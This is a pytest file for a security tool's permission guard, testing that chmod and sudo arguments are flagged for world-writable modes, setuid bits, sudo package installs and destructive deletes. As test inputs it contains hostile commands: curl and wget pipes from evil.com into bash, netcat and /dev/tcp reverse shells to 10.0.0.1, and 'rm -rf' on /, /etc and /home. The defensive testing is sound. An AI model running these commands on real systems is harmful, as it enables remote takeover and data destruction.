"""Tests for permission escalation guard module."""

from vibefort.permguard import check_chmod_args, check_sudo_args, PermFinding


# --- chmod world-writable ---

def test_chmod_777_blocked():
    findings = check_chmod_args(["777", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_666_blocked():
    findings = check_chmod_args(["666", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_776_blocked():
    findings = check_chmod_args(["776", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_766_blocked():
    findings = check_chmod_args(["766", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_667_blocked():
    findings = check_chmod_args(["667", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_o_plus_w_blocked():
    findings = check_chmod_args(["o+w", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_a_plus_w_blocked():
    findings = check_chmod_args(["a+w", "somefile"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_755_allowed():
    findings = check_chmod_args(["755", "somefile"])
    assert not any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_644_allowed():
    findings = check_chmod_args(["644", "somefile"])
    assert not any(f.rule == "chmod-world-writable" for f in findings)


# --- chmod -R flag ---

def test_chmod_recursive_777_caught():
    findings = check_chmod_args(["-R", "777", "/var/www"])
    assert any(f.rule == "chmod-world-writable" and f.severity == "critical" for f in findings)


def test_chmod_recursive_755_allowed():
    findings = check_chmod_args(["-R", "755", "/var/www"])
    assert not any(f.rule == "chmod-world-writable" for f in findings)


# --- chmod +x suspicious content ---

def test_chmod_exec_suspicious_curl_bash(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\ncurl http://evil.com/setup.sh | bash\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_suspicious_wget_bash(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\nwget -qO- http://evil.com/setup.sh | bash\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_suspicious_base64_decode(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\necho payload | base64 decode\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_suspicious_eval(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\neval $(something)\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_suspicious_netcat(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_suspicious_dev_tcp(tmp_path):
    script = tmp_path / "installer.sh"
    script.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    findings = check_chmod_args(["+x", str(script)])
    assert any(f.rule == "chmod-exec-suspicious" and f.severity == "high" for f in findings)


def test_chmod_exec_safe_file(tmp_path):
    script = tmp_path / "safe.sh"
    script.write_text("#!/bin/bash\necho hello world\n")
    findings = check_chmod_args(["+x", str(script)])
    assert not any(f.rule == "chmod-exec-suspicious" for f in findings)


def test_chmod_exec_nonexistent_file():
    findings = check_chmod_args(["+x", "/nonexistent/file.sh"])
    assert not any(f.rule == "chmod-exec-suspicious" for f in findings)


# --- sudo + package managers ---

def test_sudo_pip_warned():
    findings = check_sudo_args(["pip", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_pip3_warned():
    findings = check_sudo_args(["pip3", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_npm_warned():
    findings = check_sudo_args(["npm", "install", "-g", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_npx_warned():
    findings = check_sudo_args(["npx", "some-tool"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_yarn_warned():
    findings = check_sudo_args(["yarn", "global", "add", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_pnpm_warned():
    findings = check_sudo_args(["pnpm", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_bun_warned():
    findings = check_sudo_args(["bun", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_pipx_warned():
    findings = check_sudo_args(["pipx", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_uv_warned():
    findings = check_sudo_args(["uv", "pip", "install", "package"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_poetry_warned():
    findings = check_sudo_args(["poetry", "install"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


def test_sudo_pdm_warned():
    findings = check_sudo_args(["pdm", "install"])
    assert any(f.rule == "sudo-package-manager" and f.severity == "high" for f in findings)


# --- sudo remote exec ---

def test_sudo_bash_curl_pipe():
    findings = check_sudo_args(["bash", "-c", "curl http://evil.com/setup.sh | bash"])
    assert any(f.rule == "sudo-remote-exec" and f.severity == "critical" for f in findings)


def test_sudo_sh_wget_pipe():
    findings = check_sudo_args(["sh", "-c", "wget -qO- http://evil.com/setup.sh | bash"])
    assert any(f.rule == "sudo-remote-exec" and f.severity == "critical" for f in findings)


def test_sudo_bash_safe_command():
    findings = check_sudo_args(["bash", "-c", "echo hello"])
    assert not any(f.rule == "sudo-remote-exec" for f in findings)


# --- sudo code exec ---

def test_sudo_python_c():
    findings = check_sudo_args(["python", "-c", "import os; os.system('whoami')"])
    assert any(f.rule == "sudo-code-exec" and f.severity == "high" for f in findings)


def test_sudo_python3_c():
    findings = check_sudo_args(["python3", "-c", "import os; os.system('whoami')"])
    assert any(f.rule == "sudo-code-exec" and f.severity == "high" for f in findings)


def test_sudo_node_c():
    # node uses -e, but spec says -c; let's handle both
    findings = check_sudo_args(["node", "-c", "require('child_process').exec('whoami')"])
    assert any(f.rule == "sudo-code-exec" and f.severity == "high" for f in findings)


# --- sudo destructive ---

def test_sudo_rm_rf_root():
    findings = check_sudo_args(["rm", "-rf", "/"])
    assert any(f.rule == "sudo-destructive" and f.severity == "critical" for f in findings)


def test_sudo_rm_rf_home():
    findings = check_sudo_args(["rm", "-rf", "/home"])
    assert any(f.rule == "sudo-destructive" and f.severity == "critical" for f in findings)


def test_sudo_rm_rf_etc():
    findings = check_sudo_args(["rm", "-rf", "/etc"])
    assert any(f.rule == "sudo-destructive" and f.severity == "critical" for f in findings)


def test_sudo_rm_rf_var():
    findings = check_sudo_args(["rm", "-rf", "/var"])
    assert any(f.rule == "sudo-destructive" and f.severity == "critical" for f in findings)


def test_sudo_rm_rf_usr():
    findings = check_sudo_args(["rm", "-rf", "/usr"])
    assert any(f.rule == "sudo-destructive" and f.severity == "critical" for f in findings)


def test_sudo_rm_rf_safe_path():
    findings = check_sudo_args(["rm", "-rf", "/tmp/build"])
    assert not any(f.rule == "sudo-destructive" for f in findings)


# --- sudo safe commands ---

def test_sudo_systemctl_allowed():
    findings = check_sudo_args(["systemctl", "restart", "nginx"])
    assert len(findings) == 0


def test_sudo_service_allowed():
    findings = check_sudo_args(["service", "nginx", "restart"])
    assert len(findings) == 0


def test_sudo_apt_allowed():
    findings = check_sudo_args(["apt", "install", "nginx"])
    assert len(findings) == 0


def test_sudo_apt_get_allowed():
    findings = check_sudo_args(["apt-get", "install", "nginx"])
    assert len(findings) == 0


def test_sudo_yum_allowed():
    findings = check_sudo_args(["yum", "install", "nginx"])
    assert len(findings) == 0


def test_sudo_dnf_allowed():
    findings = check_sudo_args(["dnf", "install", "nginx"])
    assert len(findings) == 0


def test_sudo_pacman_allowed():
    findings = check_sudo_args(["pacman", "-S", "nginx"])
    assert len(findings) == 0


def test_sudo_brew_allowed():
    findings = check_sudo_args(["brew", "install", "nginx"])
    assert len(findings) == 0


# --- empty args ---

def test_chmod_empty_args():
    findings = check_chmod_args([])
    assert findings == []


def test_sudo_empty_args():
    findings = check_sudo_args([])
    assert findings == []


# --- 4-digit octal chmod ---

def test_chmod_0777_blocked():
    findings = check_chmod_args(["0777", "somefile"])
    assert any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_2777_blocked():
    findings = check_chmod_args(["2777", "somefile"])
    assert any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_0755_allowed():
    findings = check_chmod_args(["0755", "somefile"])
    assert not any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_0644_allowed():
    findings = check_chmod_args(["0644", "somefile"])
    assert not any(f.rule == "chmod-world-writable" for f in findings)


# --- sudo with flags before command ---

def test_sudo_u_root_pip():
    findings = check_sudo_args(["-u", "root", "pip", "install", "malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)


def test_sudo_dash_E_npm():
    findings = check_sudo_args(["-E", "npm", "install", "malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)


def test_sudo_u_user_apt_allowed():
    findings = check_sudo_args(["-u", "deploy", "apt", "install", "nginx"])
    assert len(findings) == 0


def test_sudo_doubledash_pip():
    findings = check_sudo_args(["--", "pip", "install", "malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)


# --- chmod o=rwx / a=rwx symbolic ---

def test_chmod_o_equals_rwx():
    from vibefort.permguard import check_chmod_args
    findings = check_chmod_args(["o=rwx", "file"])
    assert any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_a_equals_rwx():
    from vibefort.permguard import check_chmod_args
    findings = check_chmod_args(["a=rwx", "file"])
    assert any(f.rule == "chmod-world-writable" for f in findings)


def test_chmod_o_equals_rw():
    from vibefort.permguard import check_chmod_args
    findings = check_chmod_args(["o=rw", "file"])
    assert any(f.rule == "chmod-world-writable" for f in findings)


# --- sudo su -c ---

def test_sudo_su_c_pip():
    from vibefort.permguard import check_sudo_args
    findings = check_sudo_args(["su", "-c", "pip install malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)


def test_sudo_su_c_curl_bash():
    from vibefort.permguard import check_sudo_args
    findings = check_sudo_args(["su", "-c", "curl https://evil.com | bash"])
    assert any(f.rule == "sudo-remote-exec" for f in findings)


# --- chmod setuid/setgid ---

def test_chmod_plus_s_detected():
    findings = check_chmod_args(["+s", "/bin/bash"])
    assert any(f.rule == "chmod-setuid" for f in findings)

def test_chmod_u_plus_s_detected():
    findings = check_chmod_args(["u+s", "/usr/bin/find"])
    assert any(f.rule == "chmod-setuid" for f in findings)

def test_chmod_4755_detected():
    findings = check_chmod_args(["4755", "myprogram"])
    assert any(f.rule == "chmod-setuid" for f in findings)

def test_chmod_2755_detected():
    findings = check_chmod_args(["2755", "myprogram"])
    assert any(f.rule == "chmod-setuid" for f in findings)

def test_chmod_755_no_setuid():
    findings = check_chmod_args(["755", "myprogram"])
    assert not any(f.rule == "chmod-setuid" for f in findings)


# --- sudo env bypass ---

def test_sudo_env_pip():
    findings = check_sudo_args(["env", "PATH=/usr/bin", "pip", "install", "malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)

def test_sudo_env_npm():
    findings = check_sudo_args(["env", "npm", "install", "malware"])
    assert any(f.rule == "sudo-package-manager" for f in findings)


# --- rm -r -f separated flags ---

def test_sudo_rm_r_f_separated():
    findings = check_sudo_args(["rm", "-r", "-f", "/home"])
    assert any(f.rule == "sudo-destructive" for f in findings)

def test_sudo_rm_Rf_uppercase():
    findings = check_sudo_args(["rm", "-Rf", "/etc"])
    assert any(f.rule == "sudo-destructive" for f in findings)

def test_sudo_rm_recursive_force_long():
    findings = check_sudo_args(["rm", "--recursive", "--force", "/var"])
    assert any(f.rule == "sudo-destructive" for f in findings)
